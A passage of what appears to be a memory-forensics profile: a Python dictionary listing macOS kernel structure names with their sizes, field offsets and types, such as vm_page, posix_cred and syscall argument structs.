    'if_pf_kif': [0x4a8, ['pointer', ['pfi_kif']]],
    'if_cached_route_lock': [0x4b0, ['__unnamed_12877919']],
    'if_fwd_cacheok': [0x4c0, ['unsigned int']],
    'if_fwd_route': [0x4c8, ['route']],
    'if_src_route': [0x4f0, ['route']],
    'if_src_route6': [0x518, ['route_in6']],
    'if_llreach_lock': [0x548, ['__unnamed_12877775']],
    'if_ll_srcs': [0x558, ['ll_reach_tree']],
    'if_bridge': [0x560, ['pointer', ['void']]],
    'if_want_aggressive_drain': [0x568, ['unsigned int']],
    'if_idle_flags': [0x56c, ['unsigned int']],
    'if_idle_new_flags': [0x570, ['unsigned int']],
    'if_idle_new_flags_mask': [0x574, ['unsigned int']],
    'if_route_refcnt': [0x578, ['unsigned int']],
    'if_tc': [0x580, ['if_traffic_class']],
    'if_igi': [0x620, ['pointer', ['igmp_ifinfo']]],
    'if_mli': [0x628, ['pointer', ['mld_ifinfo']]],
    'if_lqm': [0x630, ['int']],
    'if_tcp_stat': [0x638, ['pointer', ['tcpstat_local']]],
    'if_udp_stat': [0x640, ['pointer', ['udpstat_local']]],
    'if_log': [0x648, ['__unnamed_12886411']],
    'if_delegated': [0x658, ['__unnamed_12886498']],
    'if_data_threshold': [0x670, ['unsigned long long']],
    'if_fg_sendts': [0x678, ['unsigned int']],
    'if_inet6data_lock': [0x67c, ['__unnamed_12877775']],
    'if_inet6data': [0x690, ['pointer', ['void']]],
}],
  '__unnamed_4570324': [ 0x8, {
    'index': [0x0, ['unsigned int']],
    'port': [0x0, ['pointer', ['ipc_port']]],
}],
  'randomtab': [ 0x60, {
    'ru_bits': [0x0, ['int']],
    'ru_out': [0x8, ['long']],
    'ru_max': [0x10, ['unsigned int']],
    'ru_gen': [0x14, ['unsigned int']],
    'ru_n': [0x18, ['unsigned int']],
    'ru_agen': [0x1c, ['unsigned int']],
    'ru_m': [0x20, ['unsigned int']],
    'pfacts': [0x24, ['array', 4, ['unsigned int']]],
    'ru_counter': [0x34, ['unsigned int']],
    'ru_msb': [0x38, ['unsigned int']],
    'ru_x': [0x3c, ['unsigned int']],
    'ru_seed': [0x40, ['unsigned int']],
    'ru_seed2': [0x44, ['unsigned int']],
    'ru_a': [0x48, ['unsigned int']],
    'ru_b': [0x4c, ['unsigned int']],
    'ru_g': [0x50, ['unsigned int']],
    'ru_reseed': [0x58, ['long']],
}],
  'pfr_table': [ 0x428, {
    'pfrt_anchor': [0x0, ['array', 1024, ['char']]],
    'pfrt_name': [0x400, ['array', 32, ['char']]],
    'pfrt_flags': [0x420, ['unsigned int']],
    'pfrt_fback': [0x424, ['unsigned char']],
}],
  '_ipfw_insn_pipe': [ 0x10, {
    'o': [0x0, ['_ipfw_insn']],
    'pipe_ptr': [0x8, ['pointer', ['void']]],
}],
  'if_family_id': [ 0xc, {
    'iffmid_len': [0x0, ['unsigned int']],
    'iffmid_id': [0x4, ['unsigned int']],
    'iffmid_str': [0x8, ['array', 1, ['char']]],
}],
  'pread_args': [ 0x20, {
    'fd_l_': [0x0, ['array', 0, ['char']]],
    'fd': [0x0, ['int']],
    'fd_r_': [0x4, ['array', 4, ['char']]],
    'buf_l_': [0x8, ['array', 0, ['char']]],
    'buf': [0x8, ['unsigned long long']],
    'nbyte_l_': [0x10, ['array', 0, ['char']]],
    'buf_r_': [0x10, ['array', 0, ['char']]],
    'nbyte': [0x10, ['unsigned long long']],
    'offset_l_': [0x18, ['array', 0, ['char']]],
    'offset': [0x18, ['long long']],
    'nbyte_r_': [0x18, ['array', 0, ['char']]],
    'offset_r_': [0x20, ['array', 0, ['char']]],
}],
  'm_tag': [ 0x18, {
    'm_tag_cookie': [0x0, ['unsigned long long']],
    'm_tag_link': [0x8, ['__unnamed_16554225']],
    'm_tag_type': [0x10, ['unsigned short']],
    'm_tag_len': [0x12, ['unsigned short']],
    'm_tag_id': [0x14, ['unsigned int']],
}],
  'pf_state_cmp': [ 0x10, {
    'id': [0x0, ['unsigned long long']],
    'creatorid': [0x8, ['unsigned int']],
    'pad': [0xc, ['unsigned int']],
}],
  'kev_vendor_code': [ 0xcc, {
    'vendor_code': [0x0, ['unsigned int']],
    'vendor_string': [0x4, ['array', 200, ['char']]],
}],
  'aio_workq': [ 0x30, {
    'aioq_entries': [0x0, ['__unnamed_10956260']],
    'aioq_count': [0x10, ['int']],
    'aioq_mtx': [0x18, ['__unnamed_10939205']],
    'aioq_waitq': [0x28, ['pointer', ['wait_queue']]],
}],
  'flowadv': [ 0x4, {
    'code': [0x0, ['int']],
}],
  'mac_module_data_list': [ 0x28, {
    'count': [0x0, ['unsigned int']],
    'type': [0x4, ['unsigned int']],
    'list': [0x8, ['array', 1, ['mac_module_data_element']]],
}],
  'timebase_freq_t': [ 0x10, {
    'timebase_num': [0x0, ['unsigned long']],
    'timebase_den': [0x8, ['unsigned long']],
}],
  'igmpv3': [ 0xc, {
    'igmp_type': [0x0, ['unsigned char']],
    'igmp_code': [0x1, ['unsigned char']],
    'igmp_cksum': [0x2, ['unsigned short']],
    'igmp_group': [0x4, ['in_addr']],
    'igmp_misc': [0x8, ['unsigned char']],
    'igmp_qqi': [0x9, ['unsigned char']],
    'igmp_numsrc': [0xa, ['unsigned short']],
}],
  'gettid_args': [ 0x10, {
    'uidp': [0x0, ['unsigned long long']],
    'uidp_l_': [0x0, ['array', 0, ['char']]],
    'gidp': [0x8, ['unsigned long long']],
    'gidp_l_': [0x8, ['array', 0, ['char']]],
    'uidp_r_': [0x8, ['array', 0, ['char']]],
    'gidp_r_': [0x10, ['array', 0, ['char']]],
}],
  'utun_pcb': [ 0x90, {
    'utun_ctlref': [0x0, ['pointer', ['void']]],
    'utun_ifp': [0x8, ['pointer', ['ifnet']]],
    'utun_unit': [0x10, ['unsigned int']],
    'utun_flags': [0x14, ['unsigned int']],
    'utun_ext_ifdata_stats': [0x18, ['int']],
    'utun_crypto_ctx': [0x1c, ['array', 2, ['utun_crypto_ctx']]],
}],
  'ip6_fw_if': [ 0x14, {
    'fu_via_if': [0x0, ['__unnamed_9256116']],
    'fu_via_ip6': [0x0, ['in6_addr']],
}],
  'memorystatus_get_level_args': [ 0x8, {
    'level_l_': [0x0, ['array', 0, ['char']]],
    'level': [0x0, ['unsigned long long']],
    'level_r_': [0x8, ['array', 0, ['char']]],
}],
  'user_vmspace': [ 0x40, {
    'vm_refcnt': [0x0, ['int']],
    'vm_shm': [0x8, ['unsigned long long']],
    'vm_rssize': [0x10, ['int']],
    'vm_swrss': [0x14, ['int']],
    'vm_tsize': [0x18, ['int']],
    'vm_dsize': [0x1c, ['int']],
    'vm_ssize': [0x20, ['int']],
    'vm_taddr': [0x28, ['unsigned long long']],
    'vm_daddr': [0x30, ['unsigned long long']],
    'vm_maxsaddr': [0x38, ['unsigned long long']],
}],
  'vfork_args': [ 0x4, {
    'dummy': [0x0, ['int']],
}],
  'vnodeopv_entry_desc': [ 0x10, {
    'opve_op': [0x0, ['pointer', ['vnodeop_desc']]],
    'opve_impl': [0x8, ['pointer', ['void']]],
}],
  'nfsd_head': [ 0x10, {
    'tqh_first': [0x0, ['pointer', ['nfsd']]],
    'tqh_last': [0x8, ['pointer', ['pointer', ['nfsd']]]],
}],
  '__unnamed_9949702': [ 0x10, {
    'le_next': [0x0, ['pointer', ['in6_multi']]],
    'le_prev': [0x8, ['pointer', ['pointer', ['in6_multi']]]],
}],
  'udpstat_local': [ 0x40, {
    'port_unreach': [0x0, ['unsigned long long']],
    'faithprefix': [0x8, ['unsigned long long']],
    'port0': [0x10, ['unsigned long long']],
    'badlength': [0x18, ['unsigned long long']],
    'badchksum': [0x20, ['unsigned long long']],
    'badmcast': [0x28, ['unsigned long long']],
    'cleanup': [0x30, ['unsigned long long']],
    'badipsec': [0x38, ['unsigned long long']],
}],
  'pf_rulequeue': [ 0x10, {
    'tqh_first': [0x0, ['pointer', ['pf_rule']]],
    'tqh_last': [0x8, ['pointer', ['pointer', ['pf_rule']]]],
}],
  'bpf_hdr': [ 0x14, {
    'bh_tstamp': [0x0, ['timeval32']],
    'bh_caplen': [0x8, ['unsigned int']],
    'bh_datalen': [0xc, ['unsigned int']],
    'bh_hdrlen': [0x10, ['unsigned short']],
}],
  'vnop_mkdir_args': [ 0x30, {
    'a_desc': [0x0, ['pointer', ['vnodeop_desc']]],
    'a_dvp': [0x8, ['pointer', ['vnode']]],
    'a_vpp': [0x10, ['pointer', ['pointer', ['vnode']]]],
    'a_cnp': [0x18, ['pointer', ['componentname']]],
    'a_vap': [0x20, ['pointer', ['vnode_attr']]],
    'a_context': [0x28, ['pointer', ['vfs_context']]],
}],
  '__unnamed_7902688': [ 0x10, {
    'ifru_data64': [0x0, ['unsigned long long']],
    'ifru_intval': [0x0, ['int']],
    'ifru_metric': [0x0, ['int']],
    'ifru_broadaddr': [0x0, ['sockaddr']],
    'ifru_type': [0x0, ['__unnamed_7903137']],
    'ifru_flags': [0x0, ['short']],
    'ifru_log': [0x0, ['__unnamed_7903035']],
    'ifru_delegated': [0x0, ['unsigned int']],
    'ifru_wake_flags': [0x0, ['unsigned int']],
    'ifru_kpi': [0x0, ['ifkpi']],
    'ifru_cap': [0x0, ['array', 2, ['int']]],
    'ifru_addr': [0x0, ['sockaddr']],
    'ifru_media': [0x0, ['int']],
    'ifru_devmtu': [0x0, ['ifdevmtu']],
    'ifru_route_refcnt': [0x0, ['unsigned int']],
    'ifru_eflags': [0x0, ['unsigned long long']],
    'ifru_data': [0x0, ['pointer', ['char']]],
    'ifru_mtu': [0x0, ['int']],
    'ifru_opportunistic': [0x0, ['__unnamed_7902965']],
    'ifru_phys': [0x0, ['int']],
    'ifru_dstaddr': [0x0, ['sockaddr']],
    'ifru_link_quality_metric': [0x0, ['int']],
}],
  'vm_map_version': [ 0x4, {
    'main_timestamp': [0x0, ['unsigned int']],
}],
  '__unnamed_17149653': [ 0x8, {
    'sle_next': [0x0, ['pointer', ['knote']]],
}],
  'pipe_fdinfo': [ 0xb8, {
    'pfi': [0x0, ['proc_fileinfo']],
    'pipeinfo': [0x18, ['pipe_info']],
}],
  'timer_call': [ 0xa8, {
    'call_entry': [0x0, ['call_entry']],
    'lock': [0x40, ['slock']],
    'soft_deadline': [0x90, ['unsigned long long']],
    'flags': [0x98, ['unsigned int']],
    'async_dequeue': [0x9c, ['int']],
    'ttd': [0xa0, ['unsigned long long']],
}],
  '__unnamed_16348702': [ 0x10, {
    'p': [0x0, ['__unnamed_16348355']],
    'v': [0x0, ['__unnamed_16344226']],
}],
  'fsetattrlist_args': [ 0x28, {
    'fd_l_': [0x0, ['array', 0, ['char']]],
    'fd': [0x0, ['int']],
    'fd_r_': [0x4, ['array', 4, ['char']]],
    'alist': [0x8, ['unsigned long long']],
    'alist_l_': [0x8, ['array', 0, ['char']]],
    'attributeBuffer': [0x10, ['unsigned long long']],
    'alist_r_': [0x10, ['array', 0, ['char']]],
    'attributeBuffer_l_': [0x10, ['array', 0, ['char']]],
    'attributeBuffer_r_': [0x18, ['array', 0, ['char']]],
    'bufferSize': [0x18, ['unsigned long long']],
    'bufferSize_l_': [0x18, ['array', 0, ['char']]],
    'options_l_': [0x20, ['array', 0, ['char']]],
    'options': [0x20, ['unsigned long long']],
    'bufferSize_r_': [0x20, ['array', 0, ['char']]],
    'options_r_': [0x28, ['array', 0, ['char']]],
}],
  'access_cache': [ 0x20, {
    'numcached': [0x0, ['int']],
    'cachehits': [0x4, ['int']],
    'lookups': [0x8, ['int']],
    'acache': [0x10, ['pointer', ['unsigned int']]],
    'haveaccess': [0x18, ['pointer', ['unsigned char']]],
}],
  'IOService_class': [ 0x88, {
    'superClass': [0x0, ['pointer', ['OSMetaClass_class']]],
    'gMetaClass': [0x0, ['MetaClass_class']],
    'metaClass': [0x0, ['pointer', ['OSMetaClass_class']]],
    'reserved': [0x28, ['pointer', ['ExpansionData']]],
    '__provider': [0x30, ['pointer', ['IOService_class']]],
    '__providerGeneration': [0x38, ['int']],
    '__owner': [0x40, ['pointer', ['IOService_class']]],
    '__state': [0x48, ['array', 2, ['unsigned int']]],
    '__timeBusy': [0x50, ['unsigned long long']],
    '__accumBusy': [0x58, ['unsigned long long']],
    'pwrMgt': [0x60, ['pointer', ['IOServicePM_class']]],
    'initialized': [0x68, ['int']],
    'pm_vars': [0x70, ['pointer', ['void']]],
    '_numInterruptSources': [0x78, ['int']],
    '_interruptSources': [0x80, ['pointer', ['IOInterruptSource']]],
}],
  'vm_page': [ 0x48, {
    'pageq': [0x0, ['queue_entry']],
    'listq': [0x10, ['queue_entry']],
    'next': [0x20, ['pointer', ['vm_page']]],
    'object': [0x28, ['pointer', ['vm_object']]],
    'offset': [0x30, ['unsigned long long']],
    'reference': [0x38, ['BitField', {'end_bit': 26, 'start_bit': 25}]],
    'private': [0x38, ['BitField', {'end_bit': 28, 'start_bit': 27}]],
    'inactive': [0x38, ['BitField', {'end_bit': 18, 'start_bit': 17}]],
    'wire_count': [0x38, ['BitField', {'end_bit': 16, 'start_bit': 0}]],
    'throttled': [0x38, ['BitField', {'end_bit': 22, 'start_bit': 21}]],
    'speculative': [0x38, ['BitField', {'end_bit': 21, 'start_bit': 20}]],
    'xpmapped': [0x38, ['BitField', {'end_bit': 30, 'start_bit': 29}]],
    'pageout_queue': [0x38, ['BitField', {'end_bit': 24, 'start_bit': 23}]],
    'local': [0x38, ['BitField', {'end_bit': 20, 'start_bit': 19}]],
    'laundry': [0x38, ['BitField', {'end_bit': 25, 'start_bit': 24}]],
    'free': [0x38, ['BitField', {'end_bit': 23, 'start_bit': 22}]],
    '__unused_pageq_bits': [0x38, ['BitField', {'end_bit': 32, 'start_bit': 30}]],
    'active': [0x38, ['BitField', {'end_bit': 17, 'start_bit': 16}]],
    'clean_queue': [0x38, ['BitField', {'end_bit': 19, 'start_bit': 18}]],
    'gobbled': [0x38, ['BitField', {'end_bit': 27, 'start_bit': 26}]],
    'no_cache': [0x38, ['BitField', {'end_bit': 29, 'start_bit': 28}]],
    'phys_page': [0x3c, ['unsigned int']],
    'slid': [0x40, ['BitField', {'end_bit': 24, 'start_bit': 23}]],
    'cs_validated': [0x40, ['BitField', {'end_bit': 20, 'start_bit': 19}]],
    'encrypted': [0x40, ['BitField', {'end_bit': 18, 'start_bit': 17}]],
    'clustered': [0x40, ['BitField', {'end_bit': 14, 'start_bit': 13}]],
    'pageout': [0x40, ['BitField', {'end_bit': 8, 'start_bit': 7}]],
    'written_by_kernel': [0x40, ['BitField', {'end_bit': 27, 'start_bit': 26}]],
    'compressor': [0x40, ['BitField', {'end_bit': 26, 'start_bit': 25}]],
    '__unused_object_bits': [0x40, ['BitField', {'end_bit': 32, 'start_bit': 27}]],
    'unusual': [0x40, ['BitField', {'end_bit': 17, 'start_bit': 16}]],
    'busy': [0x40, ['BitField', {'end_bit': 1, 'start_bit': 0}]],
    'pmapped': [0x40, ['BitField', {'end_bit': 6, 'start_bit': 5}]],
    'restart': [0x40, ['BitField', {'end_bit': 16, 'start_bit': 15}]],
    'cs_tainted': [0x40, ['BitField', {'end_bit': 21, 'start_bit': 20}]],
    'reusable': [0x40, ['BitField', {'end_bit': 22, 'start_bit': 21}]],
    'tabled': [0x40, ['BitField', {'end_bit': 3, 'start_bit': 2}]],
    'hashed': [0x40, ['BitField', {'end_bit': 4, 'start_bit': 3}]],
    'wpmapped': [0x40, ['BitField', {'end_bit': 7, 'start_bit': 6}]],
    'cleaning': [0x40, ['BitField', {'end_bit': 12, 'start_bit': 11}]],
    'precious': [0x40, ['BitField', {'end_bit': 13, 'start_bit': 12}]],
    'wanted': [0x40, ['BitField', {'end_bit': 2, 'start_bit': 1}]],
    'absent': [0x40, ['BitField', {'end_bit': 9, 'start_bit': 8}]],
    'overwriting': [0x40, ['BitField', {'end_bit': 15, 'start_bit': 14}]],
    'was_dirty': [0x40, ['BitField', {'end_bit': 25, 'start_bit': 24}]],
    'encrypted_cleaning': [0x40, ['BitField', {'end_bit': 19, 'start_bit': 18}]],
    'lopage': [0x40, ['BitField', {'end_bit': 23, 'start_bit': 22}]],
    'fictitious': [0x40, ['BitField', {'end_bit': 5, 'start_bit': 4}]],
    'dirty': [0x40, ['BitField', {'end_bit': 11, 'start_bit': 10}]],
    'error': [0x40, ['BitField', {'end_bit': 10, 'start_bit': 9}]],
    '__unused_padding': [0x44, ['unsigned int']],
}],
  'mac_label_listener': [ 0x18, {
    'mll_handle': [0x0, ['unsigned int']],
    'mll_list': [0x8, ['__unnamed_16628327']],
}],
  '__unnamed_7284565': [ 0x10, {
    'tqe_next': [0x0, ['pointer', ['hook_desc']]],
    'tqe_prev': [0x8, ['pointer', ['pointer', ['hook_desc']]]],
}],
  'au_record': [ 0x38, {
    'used': [0x0, ['char']],
    'desc': [0x4, ['int']],
    'token_q': [0x8, ['__unnamed_10840129']],
    'data': [0x18, ['pointer', ['unsigned char']]],
    'len': [0x20, ['unsigned long']],
    'au_rec_q': [0x28, ['__unnamed_10840209']],
}],
  'mach_gss_log_errorMessU': [ 0x844, {
    'In': [0x0, ['__unnamed_131036']],
}],
  'auditinfo_addr': [ 0x30, {
    'ai_auid': [0x0, ['unsigned int']],
    'ai_mask': [0x4, ['au_mask']],
    'ai_termid': [0xc, ['au_tid_addr']],
    'ai_asid': [0x24, ['int']],
    'ai_flags': [0x28, ['unsigned long long']],
}],
  'dtrace_pops': [ 0x50, {
    'dtps_provide': [0x0, ['pointer', ['void']]],
    'dtps_provide_module': [0x8, ['pointer', ['void']]],
    'dtps_enable': [0x10, ['pointer', ['void']]],
    'dtps_disable': [0x18, ['pointer', ['void']]],
    'dtps_suspend': [0x20, ['pointer', ['void']]],
    'dtps_resume': [0x28, ['pointer', ['void']]],
    'dtps_getargdesc': [0x30, ['pointer', ['void']]],
    'dtps_getargval': [0x38, ['pointer', ['void']]],
    'dtps_usermode': [0x40, ['pointer', ['void']]],
    'dtps_destroy': [0x48, ['pointer', ['void']]],
}],
  '_kevent': [ 0x50, {
    'scan': [0x0, ['_kqueue_scan']],
    'fp': [0x20, ['pointer', ['fileproc']]],
    'fd': [0x28, ['int']],
    'retval': [0x30, ['pointer', ['int']]],
    'eventlist': [0x38, ['unsigned long long']],
    'eventsize': [0x40, ['unsigned long']],
    'eventcount': [0x48, ['int']],
    'eventout': [0x4c, ['int']],
}],
  '_ps_port_action': [ 0x18, {
    'port_type': [0x0, ['Enumeration', {'target': 'int', 'choices': {0: 'PSPA_SPECIAL', 1: 'PSPA_EXCEPTION', 2: 'PSPA_AU_SESSION', 3: 'PSPA_IMP_WATCHPORTS'}}]],
    'mask': [0x4, ['unsigned int']],
    'new_port': [0x8, ['unsigned int']],
    'behavior': [0xc, ['int']],
    'flavor': [0x10, ['int']],
    'which': [0x14, ['int']],
}],
  'lio_listio_args': [ 0x20, {
    'mode_l_': [0x0, ['array', 0, ['char']]],
    'mode': [0x0, ['int']],
    'mode_r_': [0x4, ['array', 4, ['char']]],
    'aiocblist': [0x8, ['unsigned long long']],
    'aiocblist_l_': [0x8, ['array', 0, ['char']]],
    'nent_l_': [0x10, ['array', 0, ['char']]],
    'aiocblist_r_': [0x10, ['array', 0, ['char']]],
    'nent': [0x10, ['int']],
    'nent_r_': [0x14, ['array', 4, ['char']]],
    'sigp': [0x18, ['unsigned long long']],
    'sigp_l_': [0x18, ['array', 0, ['char']]],
    'sigp_r_': [0x20, ['array', 0, ['char']]],
}],
  'IODataQueue_class': [ 0x20, {
    'gMetaClass': [0x0, ['MetaClass_class']],
    'metaClass': [0x0, ['pointer', ['OSMetaClass_class']]],
    'superClass': [0x0, ['pointer', ['OSMetaClass_class']]],
    'dataQueue': [0x10, ['pointer', ['_IODataQueueMemory']]],
    'notifyMsg': [0x18, ['pointer', ['void']]],
}],
  'dtrace_dstate': [ 0x38, {
    'dtds_base': [0x0, ['pointer', ['void']]],
    'dtds_size': [0x8, ['unsigned long']],
    'dtds_hashsize': [0x10, ['unsigned long']],
    'dtds_chunksize': [0x18, ['unsigned long']],
    'dtds_hash': [0x20, ['pointer', ['dtrace_dynhash']]],
    'dtds_state': [0x28, ['Enumeration', {'target': 'int', 'choices': {0: 'DTRACE_DSTATE_CLEAN', 1: 'DTRACE_DSTATE_EMPTY', 2: 'DTRACE_DSTATE_DIRTY', 3: 'DTRACE_DSTATE_RINSING'}}]],
    'dtds_percpu': [0x30, ['pointer', ['dtrace_dstate_percpu']]],
}],
  'bond_globals_s': [ 0x20, {
    'ifbond_list': [0x0, ['ifbond_list']],
    'system': [0x10, ['__unnamed_6808931']],
    'system_priority': [0x16, ['unsigned short']],
    'verbose': [0x18, ['int']],
}],
  'slck': [ 0x10, {
    'sl_mtx': [0x0, ['pointer', ['__unnamed_10804353']]],
    'sl_locked': [0x8, ['int']],
    'sl_waiting': [0xc, ['int']],
}],
  'kauth_listener': [ 0x28, {
    'kl_link': [0x0, ['__unnamed_10969548']],
    'kl_identifier': [0x10, ['pointer', ['char']]],
    'kl_callback': [0x18, ['pointer', ['void']]],
    'kl_idata': [0x20, ['pointer', ['void']]],
}],
  'posix_cred': [ 0x60, {
    'cr_uid': [0x0, ['unsigned int']],
    'cr_ruid': [0x4, ['unsigned int']],
    'cr_svuid': [0x8, ['unsigned int']],
    'cr_ngroups': [0xc, ['short']],
    'cr_groups': [0x10, ['array', 16, ['unsigned int']]],
    'cr_rgid': [0x50, ['unsigned int']],
    'cr_svgid': [0x54, ['unsigned int']],
    'cr_gmuid': [0x58, ['unsigned int']],
    'cr_flags': [0x5c, ['int']],
}],
  'hfs_inval_blk_no': [ 0x10, {
    'sectorStart': [0x0, ['long long']],
    'sectorCount': [0x8, ['long long']],
}],
  'clmap': [ 0x18, {
    'cl_ps': [0x0, ['pointer', ['paging_segment']]],
    'cl_numpages': [0x8, ['int']],
    'cl_bmap': [0xc, ['clbmap']],
    'cl_error': [0x10, ['int']],
    'cl_alloc': [0x14, ['clbmap']],
}],
  'lseek_args': [ 0x18, {
    'fd_l_': [0x0, ['array', 0, ['char']]],
    'fd': [0x0, ['int']],
    'fd_r_': [0x4, ['array', 4, ['char']]],
    'offset_l_': [0x8, ['array', 0, ['char']]],
    'offset': [0x8, ['long long']],
    'whence': [0x10, ['int']],
    'offset_r_': [0x10, ['array', 0, ['char']]],
    'whence_l_': [0x10, ['array', 0, ['char']]],
    'whence_r_': [0x14, ['array', 4, ['char']]],
}],
  'shmdt_args': [ 0x8, {
    'shmaddr': [0x0, ['unsigned long long']],
    'shmaddr_l_': [0x0, ['array', 0, ['char']]],
    'shmaddr_r_': [0x8, ['array', 0, ['char']]],
}],
  'UNDReply': [ 0x30, {
    'lock': [0x0, ['_lck_mtx_']],
    'userLandNotificationKey': [0x10, ['int']],
    'callback': [0x18, ['pointer', ['void']]],
    'inprogress': [0x20, ['int']],
    'self_port': [0x28, ['pointer', ['ipc_port']]],
}],
  'eventreq32': [ 0x1c, {
    'er_type': [0x0, ['int']],
    'er_handle': [0x4, ['int']],
    'er_data': [0x8, ['unsigned int']],
    'er_rcnt': [0xc, ['int']],
    'er_wcnt': [0x10, ['int']],
    'er_ecnt': [0x14, ['int']],
    'er_eventbits': [0x18, ['int']],
}],
  'policy_rr_base': [ 0x8, {
    'base_priority': [0x0, ['int']],
    'quantum': [0x4, ['int']],
}],
  'shmmap_state': [ 0x10, {
    'va': [0x0, ['unsigned long long']],
    'shmid': [0x8, ['int']],
}],
  'netpolicy_event_data': [ 0x20, {
    'eupid': [0x0, ['unsigned long long']],
    'epid': [0x8, ['int']],
    'euuid': [0xc, ['array', 16, ['unsigned char']]],
}],
  'setgroups_args': [ 0x10, {
    'gidsetsize': [0x0, ['unsigned int']],
    'gidsetsize_l_': [0x0, ['array', 0, ['char']]],
    'gidsetsize_r_': [0x4, ['array', 4, ['char']]],
    'gidset_l_': [0x8, ['array', 0, ['char']]],
    'gidset': [0x8, ['unsigned long long']],
    'gidset_r_': [0x10, ['array', 0, ['char']]],
}],
  '__unnamed_8124727': [ 0x10, {
    'tqe_next': [0x0, ['pointer', ['tclass_for_proc']]],
    'tqe_prev': [0x8, ['pointer', ['pointer', ['tclass_for_proc']]]],
}],
  'kqueue_info': [ 0x90, {
    'kq_stat': [0x0, ['vinfo_stat']],
    'kq_state': [0x88, ['unsigned int']],
    'rfu_1': [0x8c, ['unsigned int']],
}],
  '__unnamed_7640186': [ 0x18, {
    '_filter_if_name': [0x0, ['array', 24, ['char']]],
    '_filter_if_type': [0x0, ['unsigned int']],
}],
  'xsockbuf': [ 0x18, {
    'sb_cc': [0x0, ['unsigned int']],
    'sb_hiwat': [0x4, ['unsigned int']],
    'sb_mbcnt': [0x8, ['unsigned int']],
    'sb_mbmax': [0xc, ['unsigned int']],
    'sb_lowat': [0x10, ['int']],
    'sb_flags': [0x14, ['short']],
    'sb_timeo': [0x16, ['short']],
}],
  '__unnamed_10547815': [ 0x4, {
    'cau_linkref': [0x0, ['unsigned int']],
    'cau_rdev': [0x0, ['int']],
}],
  '__unnamed_12512206': [ 0x18, {
    'inp4_ip_tos': [0x0, ['unsigned char']],
    'inp4_options': [0x8, ['pointer', ['mbuf']]],
    'inp4_moptions': [0x10, ['pointer', ['ip_moptions']]],
}],
  'flocktimeout': [ 0x28, {
    'fl': [0x0, ['flock']],
    'timeout': [0x18, ['timespec']],
}],
  'nstat_ifnet_cookie': [ 0x10, {
    'ifp': [0x0, ['pointer', ['ifnet']]],
    'threshold': [0x8, ['unsigned long long']],
}],
  'dn_flow_set_32': [ 0xa0, {
    'next': [0x0, ['unsigned int']],
    'fs_nr': [0x4, ['unsigned short']],
    'flags_fs': [0x6, ['unsigned short']],
    'pipe': [0x8, ['unsigned int']],
    'parent_nr': [0xc, ['unsigned short']],
    'weight': [0x10, ['int']],
    'qsize': [0x14, ['int']],
    'plr': [0x18, ['int']],
    'flow_mask': [0x1c, ['ip_flow_id']],
    'rq_size': [0x54, ['int']],
    'rq_elements': [0x58, ['int']],
    'rq': [0x5c, ['unsigned int']],
    'last_expired': [0x60, ['unsigned int']],
    'backlogged': [0x64, ['int']],
    'w_q': [0x68, ['int']],
    'max_th': [0x6c, ['int']],
    'min_th': [0x70, ['int']],
    'max_p': [0x74, ['int']],
    'c_1': [0x78, ['unsigned int']],
    'c_2': [0x7c, ['unsigned int']],
    'c_3': [0x80, ['unsigned int']],
    'c_4': [0x84, ['unsigned int']],
    'w_q_lookup': [0x88, ['unsigned int']],
    'lookup_depth': [0x8c, ['unsigned int']],
    'lookup_step': [0x90, ['int']],
    'lookup_weight': [0x94, ['int']],
    'avg_pkt_size': [0x98, ['int']],
    'max_pkt_size': [0x9c, ['int']],
}],
  'ctl_event_data': [ 0x8, {
    'ctl_id': [0x0, ['unsigned int']],
    'ctl_unit': [0x4, ['unsigned int']],
}],
  'kxld_context': [ 0x268, {
    'kext': [0x0, ['pointer', ['kxld_kext']]],
    'section_order': [0x8, ['pointer', ['kxld_array']]],
    'objects': [0x10, ['kxld_array']],
    'dependencies': [0x40, ['kxld_array']],
    'defined_symbols_by_name': [0x70, ['kxld_dict']],
    'defined_cxx_symbols_by_value': [0xe8, ['kxld_dict']],
    'obsolete_symbols_by_name': [0x160, ['kxld_dict']],
    'vtables_by_name': [0x1d8, ['kxld_dict']],
    'flags': [0x250, ['Enumeration', {'target': 'int', 'choices': {0: 'kKxldFlagDefault', 1: 'kKXLDFlagIncludeRelocs'}}]],
    'allocate_callback': [0x258, ['pointer', ['void']]],
    'cputype': [0x260, ['int']],
    'cpusubtype': [0x264, ['int']],
}],
  'bstp_task': [ 0x28, {
    'bt_next': [0x0, ['__unnamed_6519079']],
    'bt_count': [0x10, ['int']],
    'bt_func': [0x18, ['pointer', ['void']]],
    'bt_context': [0x20, ['pointer', ['void']]],
}],
  'getdirentriesattr_args': [ 0x40, {
    'fd_l_': [0x0, ['array', 0, ['char']]],
    'fd': [0x0, ['int']],
    'fd_r_': [0x4, ['array', 4, ['char']]],
    'alist_l_': [0x8, ['array', 0, ['char']]],
    'alist': [0x8, ['unsigned long long']],
    'buffer_l_': [0x10, ['array', 0, ['char']]],
    'buffer': [0x10, ['unsigned long long']],
    'alist_r_': [0x10, ['array', 0, ['char']]],
    'buffer_r_': [0x18, ['array', 0, ['char']]],
    'buffersize_l_': [0x18, ['array', 0, ['char']]],
    'buffersize': [0x18, ['unsigned long long']],
    'buffersize_r_': [0x20, ['array', 0, ['char']]],
    'count_l_': [0x20, ['array', 0, ['char']]],
    'count': [0x20, ['unsigned long long']],
    'basep_l_': [0x28, ['array', 0, ['char']]],
    'basep': [0x28, ['unsigned long long']],
    'count_r_': [0x28, ['array', 0, ['char']]],
    'basep_r_': [0x30, ['array', 0, ['char']]],
    'newstate_l_': [0x30, ['array', 0, ['char']]],
    'newstate': [0x30, ['unsigned long long']],
    'newstate_r_': [0x38, ['array', 0, ['char']]],
    'options_l_': [0x38, ['array', 0, ['char']]],
    'options': [0x38, ['unsigned long long']],
    'options_r_': [0x40, ['array', 0, ['char']]],
}],
  '__unnamed_9378780': [ 0x18, {
    'rbe_parent': [0x0, ['pointer', ['pf_anchor']]],
    'rbe_left': [0x8, ['pointer', ['pf_anchor']]],
    'rbe_right': [0x10, ['pointer', ['pf_anchor']]],
}],
  '__pthread_kill_args': [ 0x10, {
    'thread_port': [0x0, ['int']],
    'thread_port_l_': [0x0, ['array', 0, ['char']]],
    'thread_port_r_': [0x4, ['array', 4, ['char']]],
    'sig': [0x8, ['int']],
    'sig_l_': [0x8, ['array', 0, ['char']]],
    'sig_r_': [0xc, ['array', 4, ['char']]],
}],
  'memory_object_behave_info': [ 0x14, {
    'copy_strategy': [0x0, ['int']],
    'temporary': [0x4, ['int']],
    'invalidate': [0x8, ['int']],
    'silent_overwrite': [0xc, ['int']],
    'advisory_pageout': [0x10, ['int']],
